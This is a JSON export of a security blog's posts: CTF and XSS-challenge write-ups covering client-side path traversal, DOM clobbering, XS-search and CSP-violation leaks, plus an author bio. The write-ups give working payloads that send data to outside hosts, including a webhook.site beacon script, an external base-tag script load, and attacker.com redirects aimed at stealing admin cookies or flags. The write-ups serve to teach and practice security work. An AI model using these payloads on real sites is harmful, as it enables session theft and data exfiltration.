
{
    
    
    
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
    "pages": [{"date":"2025-01-05","image":"","imageAlt":"","link":"http://example.org/posts/my-second-post/","summary":"\u003cp\u003e\u003cstrong\u003etl;dr\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eBypassing CSPT filters and UUID validations implemented using Regex .\u003c/li\u003e\n\u003cli\u003eChaining CSPT and Open-Redirect to achieve XSS .\u003c/li\u003e\n\u003cli\u003eFinally XSS and retrive the admin cookie .\u003c/li\u003e\n\u003c/ul\u003e","tags":[],"text":"tl;dr\n bypassing cspt filters and uuid validations implemented using regex . chaining cspt and open-redirect to achieve xss . finally xss and retrive the admin cookie .  intigriti dropped another awesome xss challenge,this time created by @_cryptocat. the challenge felt fairly straightforward, definitely less headbanging than usual, i managed to solve it in around 20 minutes after diving in.\nðŸ”Ž challenge overview the challenge revolved around a classic note-taking application, featuring standard functionalities like creating , viewing notes and also it included an option to report the note, which would trigger an admin bot to visit and review it.\nas is typical with xss challenges, the goal was to obtain the admin bot\u0026rsquo;s cookie, which was the flag. for that we needed xss.\nfirstly taking a closer look at the 2 features, which are\n create note view note  1) create note the create note feature is straightforward. it sends a request to /api/notes/fetch, creating a note with a unique uuid. the note can then be viewed by navigating to /view?note-uuid .\n@main.route(\u0026#39;/api/notes/store\u0026#39;, methods=[\u0026#39;post\u0026#39;]) @login_required def store(): data = request.get_json() content = data.get(\u0026#39;content\u0026#39;) # server-side xss protection sanitized_content = bleach.clean(content) note = note.query.filter_by(user_id=current_user.id).first() if note: note.content = sanitized_content else: note = note(user_id=current_user.id, content=sanitized_content) db.session.add(note) db.session.commit() return jsonify({\u0026#39;success\u0026#39;: \u0026#39;note stored\u0026#39;, \u0026#39;note_id\u0026#39;: note.id}) the note content is sanitized server-side using the bleach library, so this eliminates any possibility of any quick xss.but still we had a harmless html injection.\n2) view note this appeared to be the real challenge. upon checkin view.html, it becomes clear that the note-uuid is used to fetch the note contents via the fetch() method.\nwindow.addeventlistener(\u0026#34;load\u0026#34;, function () { const urlparams = new urlsearchparams(window.location.search); const noteid = urlparams.get(\u0026#34;note\u0026#34;); if (noteid) { document.getelementbyid(\u0026#34;note-id-input\u0026#34;).value = noteid; validateandfetchnote(noteid); } }); immediately, my mind turned to cspt (client-side path traversal), given that we had control over the fetch request.\n client side path traversal attacks arises when a web application loads some content using xhr(xmlhttprequests) or fetch() and the user have control over some section of the path where to load the resource.\n taking a look at the validateandfetchnote() function\nfunction validateandfetchnote(noteid) { if (noteid \u0026amp;\u0026amp; isvaliduuid(noteid.trim())) { history.pushstate(null, \u0026#34;\u0026#34;, \u0026#34;?note=\u0026#34; + noteid); fetchnotebyid(noteid); } else { showflashmessage( \u0026#34;please enter a valid note id,\u0026#34;, \u0026#34;danger\u0026#34; ); } } looks like there are some checks after all .\nit only fetched notes with valid uuids using the isvaliduuid() function. additionally, the fetchnotebyid() function had a cspt check before making the actual fetch by using noteid.includes(\u0026quot;../\u0026quot;) .\nfunction fetchnotebyid(noteid) { if (noteid.includes(\u0026#34;../\u0026#34;)) { showflashmessage(\u0026#34;input not allowed!\u0026#34;, \u0026#34;danger\u0026#34;); return; } fetch(\u0026#34;/api/notes/fetch/\u0026#34; + decodeuricomponent(noteid), { method: \u0026#34;get\u0026#34;, headers: { \u0026#34;x-csrftoken\u0026#34;: csrf_token, }, }) .then((response) =\u0026gt; response.json()) .then((data) =\u0026gt; { if (data.content) { document.getelementbyid(\u0026#34;note-content\u0026#34;).innerhtml = dompurify.sanitize(data.content); document.getelementbyid( \u0026#34;note-content-section\u0026#34; ).style.display = \u0026#34;block\u0026#34;; showflashmessage(\u0026#34;note loaded successfully!\u0026#34;, \u0026#34;success\u0026#34;); } else if (data.error) { showflashmessage(\u0026#34;error: \u0026#34; + data.error, \u0026#34;danger\u0026#34;); } else { showflashmessage(\u0026#34;note doesn\u0026#39;t exist.\u0026#34;, \u0026#34;info\u0026#34;); } if (data.debug) { document.getelementbyid(\u0026#34;debug-content\u0026#34;).outerhtml = data.debug; document.getelementbyid( \u0026#34;debug-content-section\u0026#34; ).style.display = \u0026#34;block\u0026#34;; } }); } when our note is fetched, the server returns a json object containing the note\u0026rsquo;s content. this content is then rendered using innerhtml, with dompurify applied to sanitize it, effectively preventing xss.\nhowever, if the json response includes a debug key, its value is rendered using outerhtml without any sanitization, which can be used to get xss .\nif (data.debug) { document.getelementbyid(\u0026#34;debug-content\u0026#34;).outerhtml = data.debug; document.getelementbyid( \u0026#34;debug-content-section\u0026#34; ).style.display = \u0026#34;block\u0026#34;; } ðŸ¥· attack plan the plan is to manipulate the fetch request so that it returns a json object containing a debug key. however, the server only responds with a json object that includes a content key and the noteâ€™s content, with no way to modify this server response directly. the only method to achieve this would be to return the modified json from our own server.\nhowever, we only have cspt (client-side path traversal) at our disposal, which allows us to control the path of the fetch() request. this means we can only direct the fetch to different endpoints .\nfetch(\u0026#34;/api/notes/fetch/\u0026#34; + decodeuricomponent(noteid)) unless there is an open-redirect in any of the endpoints !!\nif we have an open-redirect, we can use the cspt to redirect the fetch() request to the endpoint having open-redirect, and then use the open redirect to send the request to our attacker\u0026rsquo;s server. from there, we can respond with a json object that includes the debug key, containing our xss payload.\nopen redirect there is an endpoint named /contact that accepts a query parameter called return. this endpoint will redirect the user to the url specified by the value of the return parameter.\n@main.route(\u0026#39;/contact\u0026#39;, methods=[\u0026#39;get\u0026#39;, \u0026#39;post\u0026#39;]) def contact(): form = contactform() return_url = request.args.get(\u0026#39;return\u0026#39;) if request.method == \u0026#39;post\u0026#39;: if form.validate_on_submit(): flash(\u0026#39;thank you for your message!\u0026#39;, \u0026#39;success\u0026#39;) if return_url and is_safe_url(return_url): return redirect(return_url) return redirect(url_for(\u0026#39;main.home\u0026#39;)) if return_url and is_safe_url(return_url): return redirect(return_url) return render_template(\u0026#39;contact.html\u0026#39;, form=form, return_url=return_url) so now we can redirect to the attackers site by just giving the attacker site as the return query parameter.\n/contact?return=https://attacker-site.com bypassing the cspt filters now that we have open-redirect in the /contact endpoint all we have to do is path traverse to that endpoint using cspt.however we have to bypass a few checks for that.\n the note uuid check -\u0026gt; isvaliduuid() function path traversal check -\u0026gt; noteid.includes(\u0026quot;../\u0026quot;)  bypassing isvaliduuid looking a bit closer at the isvaliduuid() function, we can see that it validates uuids using a regular expression.\nfunction isvaliduuid(noteid) { const uuidregex = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i; return uuidregex.test(noteid); } here the regex [0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$ only ensures that the uuid pattern appears at the end of the string. so there can be any prefix to this uuid , that means we can give ../../ before the uuid .\n../82652102-973d-429d-82e0-245a4fbfd6cb to ensure that it was a proper uuid the regex should have included a ^ in the beginnning like this.\n/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i so we can do cspt to the /contact endpoint like this.\n/view?note=../../../contact?return=http://attack\u0026amp;82652102-973d-429d-82e0-245a4fbfd6cb however ../ was still blocked !!!\nbypassing the path traversal check upon looking closer, you can see that after the noteid is being checked, it is url-decoded within the fetch function.\nif (noteid.includes(\u0026#34;../\u0026#34;)) { showflashmessage(\u0026#34;input not allowed!\u0026#34;, \u0026#34;danger\u0026#34;); return; } fetch(\u0026#34;/api/notes/fetch/\u0026#34; + decodeuricomponent(noteid), { method: \u0026#34;get\u0026#34;, headers: { \u0026#34;x-csrftoken\u0026#34;: csrf_token, }, }) so we can easily bypass this check by just double urlencoding the noteid.\nview=..%252f..%252f..%252fcontact?return=http://attacker\u0026amp;uuid so during the noteid.includes(\u0026quot;../\u0026quot;) check, the noteid will be ..%2f..%2fcontact, so the check will return false. however, when fetch() is called, noteid gets url-decoded with decodeuricomponent(noteid), turning it into ../../../contact.\nðŸš€ final payloads now that we\u0026rsquo;ve bypassed both security checks, let\u0026rsquo;s combine everything together.\n regex bypass: by using ../../../ as a prefix to the uuid, we can bypass the regex validation. path traversal check bypass: double url encoding the payload allows us to bypass the path traversal check.  with these steps, we can direct the fetch request to /contacts, which will trigger an open redirect to our attacker\u0026rsquo;s server. the server responds with json containing a debug key with the xss payload. this payload is then inserted into the outerhtml, leading to xss.\n..%252f..%252f..%252fcontact?return=https://attacker/exp.json%26e447f4e1-f7c9-439c-8378-b65b83189b60 on the attackerâ€™s server, we need to return a json object with the key debug and our xss payload as the value.\n{ \u0026#34;debug\u0026#34;: \u0026#34;\u0026lt;img src=x onerror=alert()\u0026gt;\u0026#34;} // for simple alert ðŸ’€ exploit !! finally it works!!\nto obtain the flag stored in the admin\u0026rsquo;s cookie, we can simply access document.cookie within the xss payload. once we have the cookie, we can send it to our server and solve the challenge.\n","title":"Intigriti 0824 XSS Challenge"},{"date":"2024-06-06","image":"","imageAlt":"","link":"http://example.org/posts/my-first-post/","summary":"\u003cp\u003e\u003cstrong\u003etl;dr\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eDom clobbering to clobber isDevelopmet\u003c/li\u003e\n\u003cli\u003eThrowing an error using RPO to prevent Dompurify from loading\u003c/li\u003e\n\u003cli\u003eUsing base tag\u0026rsquo;s to import our evil.js\u003c/li\u003e\n\u003c/ul\u003e","tags":["writeups"],"text":"tl;dr\n dom clobbering to clobber isdevelopmet throwing an error using rpo to prevent dompurify from loading using base tag\u0026rsquo;s to import our evil.js  ðŸ”Ž initial analysis we are given a memo sharing application , and its seems like we html injection using the memo parameter. looking at the client-side code for the application.\n\u0026lt;script integrity=\u0026#34;sha256-c1icwyrx+ivzgdtzephr2d/cs/v0sm76a7ax4ldalso=\u0026#34;\u0026gt; document.getelementbyid(\u0026#34;memoform\u0026#34;).addeventlistener(\u0026#34;submit\u0026#34;, (event) =\u0026gt; { event.preventdefault(); const memocontent = document.getelementbyid(\u0026#34;memocontentinput\u0026#34;).value; window.location.href = `${window.location.href.split(\u0026#34;?\u0026#34;)[0]}?memo=${encodeuricomponent( memocontent )}`; }); const urlparams = new urlsearchparams(window.location.search); const sharedmemo = urlparams.get(\u0026#34;memo\u0026#34;); if (sharedmemo) { const displayelement = document.getelementbyid(\u0026#34;displaymemo\u0026#34;); //don\u0026#39;t worry about xss, the csp will protect us for now  displayelement.innerhtml = sharedmemo; if (origin === \u0026#34;http://localhost\u0026#34;) isdevelopment = true; if (isdevelopment) { //testing xss sanitization for next release  try { const sanitizedmemo = dompurify.sanitize(sharedmemo); displayelement.innerhtml = sanitizedmemo; } catch (error) { const loggerscript = document.createelement(\u0026#34;script\u0026#34;); loggerscript.src = \u0026#34;./logger.js\u0026#34;; loggerscript.onload = () =\u0026gt; logerror(error); document.head.appendchild(loggerscript); } } } \u0026lt;/script\u0026gt; as you can see our input html goes into an innerhtml sink in the beginning itself, however there is no easy xss as there is a csp.\ndefault-src *; script-src \u0026#39;strict-dynamic\u0026#39; \u0026#39;sha256-bsjvkabbcti28kd1mufs4dpqxuq+v4wwuvdqwci4ixw=\u0026#39; \u0026#39;sha256-c1icwyrx+ivzgdtzephr2d/cs/v0sm76a7ax4ldalso=\u0026#39;; the csp doesnt seem too strict , the first thing that i thought of was that default src is * and there is no base uri directive in the csp .\nso we can inject a base tag with our server as the href value which will make all the scripts with relative paths in the page load resources from our server.\nhowever there is only one script being used in the page which is dompurify.js and it is being loaded way before our injection happens so we cant make it load from our server using base tags.\nhowever there is another script (logger.js) that is being loaded dynamically if certain conditions are satisfied. we can control the location from where logger.js is loaded using base tags as it is being loaded after our injection happens .\nif (origin === \u0026#34;http://localhost\u0026#34;) isdevelopment = true; if (isdevelopment) { //testing xss sanitization for next release  try { const sanitizedmemo = dompurify.sanitize(sharedmemo); displayelement.innerhtml = sanitizedmemo; } catch (error) { const loggerscript = document.createelement(\u0026#34;script\u0026#34;); loggerscript.src = \u0026#34;./logger.js\u0026#34;; loggerscript.onload = () =\u0026gt; logerror(error); document.head.appendchild(loggerscript); } } so to make logger.js load from our external server we have somehow reach the catch block. so for that to happen we need isdevelopment to be true, so that we can get inside the if block.\nisdeveloment is only set to true if the origin is localhost.at the first glance it seems impossible to set isdevelopment as true.\nhowever there are certain stuff you could to with just html injection!!\nðŸ¥· attack plan so the attack plan is to use dom clobbering here as we have html injection to define the isdevelopment variable. as isdevelopment is a global variable a simple tag with id attribute as isdevelopment will define that variable. eg\n\u0026lt;a id=\u0026#34;isdevelopment\u0026#34;\u0026gt;,\u0026lt;div id=\u0026#34;isdevelopment\u0026#34;\u0026gt; etc causing an error to reach the catch block ðŸŒŸ so now we are inside the if block , and to get to our logger.js script to load we have to get to the catch block . for that we have to cause an error somehow in these lines of code\ntry { const sanitizedmemo = dompurify.sanitize(sharedmemo); displayelement.innerhtml = sanitizedmemo; } if you look at the source code closely you can see that dompurify is being loaded as a relative path. so if we access the page like /index.html/blah dompurify will try to get loaded from /blah .\nso now that we are in the catch block we can use a base tag to load logger.js from our server.\nðŸš€ final payloads \u0026lt;a id=\u0026#34;isdevelopment\u0026#34;\u0026gt;asdf\u0026lt;/a\u0026gt;\u0026lt;base href=\u0026#34;https://alfino.free.beeceptor.com/\u0026#34;\u0026gt; where we host logger.js at https://alfino.free.beeceptor.com/logger.js\n","title":"Intigriti 0724 XSS Challenge"},{"date":"2024-05-26","image":"","imageAlt":"","link":"http://example.org/posts/angstrom/","summary":"\u003cp\u003e\u003cstrong\u003etl;dr\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eXS-search 200 / 404 .\u003c/li\u003e\n\u003cli\u003eLeaking using HTML injection in a same-site challenge.\u003c/li\u003e\n\u003cli\u003eLink tags and Error events .\u003c/li\u003e\n\u003c/ul\u003e","tags":["writeups"],"text":"tl;dr\n xs-search 200 / 404 . leaking using html injection in a same-site challenge. link tags and error events .  ðŸ”Ž initial analysis we are given the application source code and a challenge link. also, there is a waaas.js for the admin bot. looking at the application, the main functionality was the search endpoint.\ntaking a look at the code for /search endpoint in the index.js file.\napp.get(\u0026#39;/search\u0026#39;, (req, res) =\u0026gt; { if (req.cookies[\u0026#39;admin_cookie\u0026#39;] !== secretvalue) { res.status(403).send(\u0026#34;unauthorized\u0026#34;); return; } try { let query = req.query.q; for (let flag of flags) { if (flag.indexof(query) !== -1) { res.status(200).send(\u0026#34;found\u0026#34;); return; } } res.status(404).send(\u0026#34;not found\u0026#34;); } catch (e) { console.log(e); res.sendstatus(500); } }) it was basically checking if our input query was a substring of the flag. but we cannot send requests to /search due to the check in the start, which checks whether or not the request is from the admin user. so our requests would get 403 unauthorized as the response.\nðŸ¥· attack plan since we cant directly access the /search enpoint we have to somehow make the admin send those requests. one approach is to get xss anywhere in the site so we can send fetch requests bruteforce the flag. but unfortunately there is no xss in this site.\nthe next approach would be an xs-search attack to leak the flag . as the bot is visiting any url we give it. in the /search enpoint if the query is a valid substring of the flag it was returning 200 found and if its not a valid substring it was returning 404 not found.\nwe can use error events to differntiate between these 2 status codes cross site .\nbut there is another issue . . . . . same site cookies!! . looking the admin bots source code we can see that the admin cookie is same-site lax .\nconst cookie = { domain: domain, name: \u0026#34;admin_cookie\u0026#34;, value: key, httponly: true, secure: true, samesite: \u0026#39;lax\u0026#39; }; so the cookies won\u0026rsquo;t be sent on the requests which are sent from our hosted exploit as it wont be same-site ðŸ˜“.\nsamesite leaks ftw ðŸŒŸ if we have xss or html injection in any domain which is same-site to the challenge domain we can use that in our favour for same site leaks.\nthe challenge was hosted on https://wwwwwwwwaas.web.actf.co/ and all other challenges was were subdomains of web.actf.co and fortunately we had xss on markdown.web.actf.co which is same-site.\nso now we can host our exploit to leak the flag on markdown.web.actf.co .\nðŸš€ final payloads const charset = \u0026#34;abcdef1234567890{}ghijklmnopqrstuvwxyz_\u0026#34; let found = \u0026#34;actf\u0026#34; const leak_url = \u0026#34;https://webhook.site/4d3c543c-1211-4c4c-9fea-c7fc3336e2a5\u0026#34; const next = (i) =\u0026gt; { char = charset[i] link = document.createelement(\u0026#34;link\u0026#34;) link.rel = \u0026#34;stylesheet\u0026#34; document.head.appendchild(link) link.onload = () =\u0026gt; { found += charset[i] navigator.sendbeacon(leak_url,json.stringify({type: \u0026#34;success\u0026#34;, found:found,char:charset[i] })) next(0) } link.onerror = () =\u0026gt; { next(i+1) } link.href = \u0026#34;https://wwwwwwwwaas.web.actf.co/search?q=\u0026#34;+found+charset[i] } next(0) ðŸš© flag actf{the_w_watermarks_the_whereabouts}\n","title":"WaterMark as a Service AngstromCTF"},{"date":"2024-05-26","image":"","imageAlt":"","link":"http://example.org/posts/hacklu/","summary":"\u003cp\u003e\u003cstrong\u003etl;dr\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003emeta redirect to attacker website, using the html injection in the paaad.\u003c/li\u003e\n\u003cli\u003eleak the unique subdomain with csp violation.\u003c/li\u003e\n\u003cli\u003eAnother meta redirect csrf with the leaked subdomain to make the note public.\u003c/li\u003e\n\u003c/ul\u003e","tags":["writeups"],"text":"tl;dr\n meta redirect to attacker website, using the html injection in the paaad. leak the unique subdomain with csp violation. another meta redirect csrf with the leaked subdomain to make the note public.  no. of solves: 5\nðŸ”Ž initial analysis we are given the application source code and a challenge link. also there is a bot.js for the admin bot. so it was some client side challenge. looking at the application, its main functionality was to create pads (basically notes ) and view them. there was html and markdown allowed in the contents of the pad.\nlooking at the bot.js file .\nlet page = await browser.newpage(); // login  await page.goto(`https://${domain}/user/login`, { waituntil: \u0026#39;networkidle0\u0026#39; }); // wait until page load  // generate admin creds  await page.type(\u0026#39;#username\u0026#39;, admin_username); await page.type(\u0026#39;#password\u0026#39;, admin_password); // click and wait for navigation  await promise.all([ page.click(\u0026#39;#submit\u0026#39;), page.waitfornavigation({ waituntil: \u0026#39;networkidle0\u0026#39; }), ]); // create flag pad  await page.goto(`https://${domain}/p/new`, { waituntil: \u0026#39;networkidle0\u0026#39; }); // wait until page load  await page.type(\u0026#39;#title\u0026#39;, \u0026#39;flag\u0026#39;); await page.type(\u0026#39;#content\u0026#39;, flag); // click and wait for navigation  await promise.all([ page.click(\u0026#39;#submit\u0026#39;), page.waitfornavigation({ waituntil: \u0026#39;networkidle0\u0026#39; }), ]) // avoid leaking anything  await page.close(); page = await browser.newpage(); page.on(\u0026#39;console\u0026#39;, (msg) =\u0026gt; { console.log(\u0026#39;[console]\u0026#39;, msg); }); // open the link  console.log(`visiting url: https://${padid}.${domain}`); await page.goto(`https://${padid}.${domain}`); after looking at bot.js it\u0026rsquo;s clear that the flag is in the admins pad. so we have to somehow steal the contents of the admins pad using xss or using some other client side attack. but unfortunately, the content inside the pad is sanitized using the html sanitizer api . so there is no chance for direct xss to steal the admins pad.\nconst markdown = (md) =\u0026gt; { return md.replace(/__(.*?)__/gs, \u0026#39;\u0026lt;strong\u0026gt;$1\u0026lt;/strong\u0026gt;\u0026#39;) .replace(/_(.*?)_/gs, \u0026#39;\u0026lt;em\u0026gt;$1\u0026lt;/em\u0026gt;\u0026#39;) .replace(/## (.*?)\\n/gs, \u0026#39;\u0026lt;h2\u0026gt;$1\u0026lt;/h2\u0026gt;\u0026#39;) .replace(/# (.*?)\\n/gs, \u0026#39;\u0026lt;h1\u0026gt;$1\u0026lt;/h1\u0026gt;\u0026#39;) .replace(/!\\[(.*?)\\]\\((.*?)\\)/gs, \u0026#39;\u0026lt;img alt=\u0026#34;$1\u0026#34; src=\u0026#34;$2\u0026#34; /\u0026gt;\u0026#39;) .replace(/\\[(.*?)\\]\\((.*?)\\)/gs, \u0026#39;\u0026lt;a href=\u0026#34;$2\u0026#34;\u0026gt;$1\u0026lt;/a\u0026gt;\u0026#39;) .replace(/`(.*?)`/gs, \u0026#39;\u0026lt;code\u0026gt;$1\u0026lt;/code\u0026gt;\u0026#39;) .replace(/\\n/gs, \u0026#39;\u0026lt;br\u0026gt;\u0026#39;) } let md = markdown(padcontent.dataset.content) const sanitizer = new sanitizer() padcontent.sethtml(md, { sanitizer }) looking at the code to create pads at the /p/new endpoint. we can see that there is a cookie called latest being set with a unique_id.\nrouter.post(\u0026#39;/p/new\u0026#39;, ensureauthenticated, async (req, res) =\u0026gt; { let {title, content, ispublic, istemp} = req.body let pad = new pad({ username: req.session.username, title, content, ispublic: ispublic ? true : false, createdat: istemp ? new date() : undefined }) console.log(pad) await pad.save() res.cookie(\u0026#39;latest\u0026#39;, {title, uniqueid: pad.uniqueid}, { secure: true, httponly: true, samesite: \u0026#39;none\u0026#39;, }) req.flash(\u0026#39;success\u0026#39;, \u0026#39;pad created.\u0026#39;) return res.redirect(\u0026#39;/\u0026#39;) }) and the pad can be viewed by visiting that unique subdomain unique_id.paaad.space . looking at the code for that.\nrouter.get(\u0026#39;/\u0026#39;, ensureauthenticated, async (req, res) =\u0026gt; { // get id from subdomain  let id = req.subdomains[0] // show the index page  if(!id){ let pads = await pad.find({username: req.session.username}) return res.render(\u0026#39;index\u0026#39;, { username: req.session.username, latest: req.cookies.latest, pads }) } if (!/^[a-f0-9]{48}$/.test(id)){ req.flash(\u0026#39;danger\u0026#39;, \u0026#39;invalid pÃ¤Ã¤Ã¤d id.\u0026#39;) return res.redirect(`https://${process.env.domain}`) } // find pad with id  let pad = await pad.findone({uniqueid: id}) here it is taking the id from req.subdomains[0] and fetching the pad from the database with that id . so anyone with that unique id can view the contents of the pad, since there are no checks.\nðŸ¥· attack plan so if we can manage to somehow get the admin pads unique_id , we can access his pad. so the idea is to somehow leak this unique subdomain. there is another feature of this application that i found interesting, that allows you to view the latest note created by a user.\nlooking at the code for that functionality.\nrouter.get(\u0026#39;/p/latest\u0026#39;, async (req, res) =\u0026gt; { if(!req.cookies.latest){ req.flash(\u0026#39;danger\u0026#39;, \u0026#39;no latest pÃ¤Ã¤Ã¤d.\u0026#39;) return res.redirect(\u0026#39;/\u0026#39;) } let id = req.cookies.latest.uniqueid if (!/^[a-f0-9]{48}$/.test(id)){ req.flash(\u0026#39;danger\u0026#39;, \u0026#39;invalid pÃ¤Ã¤Ã¤d id.\u0026#39;) return res.redirect(`https://${process.env.domain}`) } return res.redirect(`https://${id}.${process.env.domain}`) }) basically, if we visit the endpoint /p/latest with the cookie latest, it will redirect to unique_id.paaad.space. so if we manage to somehow leak the subdomain from this redirection we can get the pad.\nthe initial plan is to use csp violations to leak the subdomain. so to do that we have to first redirect the bot to our attacker\u0026rsquo;s website. since .sethtml() allows meta tags we can use a meta redirect to our attacker controlled website .\ncsp violation leak ðŸŒŸ if we put https://xn--pd-viaaa.space/p/latest  in an iframe and then add a csp with frame-src https://xn--pd-viaaa.space/p/latest  it will trigger a csp violation , because https://xn--pd-viaaa.space/p/latest  redirects to unique_id.xn--pd-viaaa.space .\nso using this technique we can leak the unique_id .\ncsrf to make the note public ðŸŒŸ after getting the unique id there is still one more problem to solve. the admins pad is not public, so we can\u0026rsquo;t access it directly due to this check.\nif(!pad.ispublic \u0026amp;\u0026amp; req.session.username != pad.username){ req.flash(\u0026#39;danger\u0026#39;, \u0026#39;not allowed to access this non-public pÃ¤Ã¤Ã¤d.\u0026#39;) return res.redirect(`https://${process.env.domain}`) } the code to make the note public is as follows.\nif(req.session.username == pad.username){ if(req.query.edit==\u0026#39;ispublic\u0026#39;){ pad.ispublic = !pad.ispublic await pad.save() return res.redirect(`https://${id}.${process.env.domain}`) } if(req.query.edit==\u0026#39;istemp\u0026#39;){ pad.createdat = pad.createdat ? undefined : new date() await pad.save() return res.redirect(`https://${id}.${process.env.domain}`) } } so we just have to make the admin send a get request using ?edit=ispublic to make the note public. but unfortunately, the session cookie is having samesite: 'strict' . so doing a csrf to make the note public won\u0026rsquo;t work.\nto overcome this we can run the bot twice, the first time to leak the unique_id and the next time with a pad that has a meta redirect to unique_id.xn--pd-viaaa.space?edit=ispublic to make the note public.\nðŸš€ final payloads first pad\n\u0026lt;!-- redirect to attacker site --\u0026gt; \u0026lt;meta http-equiv=\u0026#34;refresh\u0026#34; content=\u0026#34;1; url=https://attacker.com/attacker.html\u0026#34;\u0026gt; https://attacker.com/attacker.html\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;content-security-policy\u0026#34; content=\u0026#34;frame-src \u0026#39;self\u0026#39; xn--pd-viaaa.space;\u0026#34;\u0026gt; \u0026lt;title\u0026gt;test\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; document.addeventlistener(\u0026#39;securitypolicyviolation\u0026#39;, async function (event) { console.log(event) navigator.sendbeacon(location.href,event.blockeduri) }); \u0026lt;/script\u0026gt; \u0026lt;iframe src=\u0026#34;https://pÃ¤Ã¤Ã¤d.space/p/latest\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; second pad\n\u0026lt;!-- to make pad public--\u0026gt; \u0026lt;meta http-equiv=\u0026#34;refresh\u0026#34; content=\u0026#34;1; url=unique_id.xn--pd-viaaa.space?edit=ispublic\u0026#34;\u0026gt; ðŸš© flag flag{hmmmmmmmmmxdd} \n","title":"pÃ¤Ã¤Ã¤d - Hack.lu CTF 2023 "},{"date":"0001-01-01","image":"","imageAlt":"","link":"http://example.org/pages/about/","summary":"Hey there , Im Alfin Joseph a.k.a alfin. I am Currently doing my undergraduate in Computer Science and Engineering from Amrita Vishwa Vidyapeetham, India. ðŸ‡®ðŸ‡³\nMy Interests ðŸŽ¯  Im a Web security researcher and CTF player. My focus has been mainly on client-side vulnerabilities. Currently doing research and CTF\u0026rsquo;s with bi0s.  Security Advisories  CVE-2023-52555 Discoverd a Cross-Site Request Forgery(CSRF) in Mongo-Express . CVE-2025-00192 Discoverd a Medium Severity XSS vulnerability in OpenUI .","tags":[],"text":"hey there , im alfin joseph a.k.a alfin. i am currently doing my undergraduate in computer science and engineering from amrita vishwa vidyapeetham, india. ðŸ‡®ðŸ‡³\nmy interests ðŸŽ¯  im a web security researcher and ctf player. my focus has been mainly on client-side vulnerabilities. currently doing research and ctf\u0026rsquo;s with bi0s.  security advisories  cve-2023-52555 discoverd a cross-site request forgery(csrf) in mongo-express . cve-2025-00192 discoverd a medium severity xss vulnerability in openui .  ","title":"About"}]
}

